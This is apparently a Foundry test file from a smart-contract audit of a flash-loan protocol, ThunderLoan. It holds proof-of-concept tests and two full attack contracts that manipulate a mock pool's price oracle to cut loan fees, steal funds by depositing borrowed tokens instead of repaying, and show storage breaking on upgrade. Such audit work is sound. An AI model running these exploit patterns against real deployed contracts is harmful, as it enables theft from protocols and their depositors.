// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
import { ERC20Mock } from "../mocks/ERC20Mock.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";
import { BuffMockTSwap } from "../mocks/BuffMockTSwap.sol";
import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";

contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_TEST = 100e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    uint256 constant LOAN_AMOUNT = 50e18;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    /////////////////
    /// Modifiers ///
    /////////////////
    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    /////////////////
    /// Functions ///
    /////////////////
    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testOracleManipulation() public {
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
        address tswapPool = pf.createPool(address(tokenA));
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));

        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_TEST);
        tokenA.approve(address(tswapPool), DEPOSIT_TEST);
        weth.mint(liquidityProvider, DEPOSIT_TEST);
        weth.approve(address(tswapPool), DEPOSIT_TEST);
        BuffMockTSwap(tswapPool).deposit(DEPOSIT_TEST, DEPOSIT_TEST, DEPOSIT_TEST, block.timestamp);
        vm.stopPrank();

        vm.startPrank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        vm.stopPrank();
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();

        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, DEPOSIT_TEST);
        console.log("normalFeeCost", normalFeeCost);

        uint256 amountToBorrow = LOAN_AMOUNT;
        MaliciousFlashLoanReceiver mflr = new MaliciousFlashLoanReceiver(address(tswapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA)));

        vm.startPrank(user);
        tokenA.mint(address(mflr), DEPOSIT_TEST);
        thunderLoan.flashloan(address(mflr), tokenA, amountToBorrow, "");
        vm.stopPrank();
        uint256 attackFee = mflr.feeOne() + mflr.feeTwo();
        console.log("Attack fee is", attackFee);
        assert(attackFee < normalFeeCost);
    }

    function testUseDepositInsteadOfRepayToStealFunds() public setAllowedToken hasDeposits {
        vm.startPrank(user);
        uint256 amountToBorrow = LOAN_AMOUNT;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
        tokenA.mint(address(dor), fee);
        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
        dor.redeemMoney();
        vm.stopPrank();

        uint256 balanceStolen = tokenA.balanceOf(address(dor));
        console.log("Loan Amount was ", LOAN_AMOUNT);
        console.log("Balance Stolen is ", balanceStolen);
        assert(balanceStolen > LOAN_AMOUNT);
    }

    function testUpgradeBreaksStorage() public {
        uint256 feeBeforeUpgrade = thunderLoan.getFee();

        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(upgraded), "");
        uint256 feeAfterUpgrade = thunderLoan.getFee();
        vm.stopPrank();

        console.log("feeBeforeUpgrade: ", feeBeforeUpgrade);
        console.log("feeAfterUpgrade: ", feeAfterUpgrade);
        assert(feeBeforeUpgrade != feeAfterUpgrade);
    }
}

///////////////////////////
/// Aditional Contracts ///
///////////////////////////
contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    address repayAddress;
    BuffMockTSwap tswapPool;
    bool attacked;
    uint256 public feeOne;
    uint256 public feeTwo;

    uint256 constant DEPOSIT_TEST = 100e18;
    uint256 constant DEPOSIT_AMOUNT = 1000e18;
    uint256 constant LOAN_AMOUNT = 50e18;

    constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
        tswapPool = BuffMockTSwap(_tswapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /*params*/
    )
        external
        returns (bool) 
    {
        if (!attacked) {
            // 1. Swap tokenA borrowed for WETH
            // 2. Take out ANOTHER flash loan, to show the difference
            feeOne = fee;
            attacked = true;
            uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(
                LOAN_AMOUNT,
                DEPOSIT_TEST,
                DEPOSIT_TEST
            );
            IERC20(token).approve(address(tswapPool), LOAN_AMOUNT);
            // Tanks the Price
            tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(LOAN_AMOUNT, wethBought, block.timestamp);
            // We call a second flash loan
            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
            // Repayment of loans
            IERC20(token).transfer(address(repayAddress), amount + fee);
        } else {
            // Calculate the fee and repay
            feeTwo = fee;
            IERC20(token).transfer(address(repayAddress), amount + fee);
        }
        return true;
    }
}

contract DepositOverRepay is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    AssetToken assetToken;
    IERC20 s_token;
    
    constructor(address _thunderLoan) {
        thunderLoan = ThunderLoan(_thunderLoan);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /*params*/
    )
        external
        returns (bool) 
    {
        s_token = IERC20(token);
        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
        IERC20(token).approve(address(thunderLoan), amount + fee);
        thunderLoan.deposit(IERC20(token), amount + fee);
        return true;
    }

    function redeemMoney() public {
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(s_token, amount);
    }
}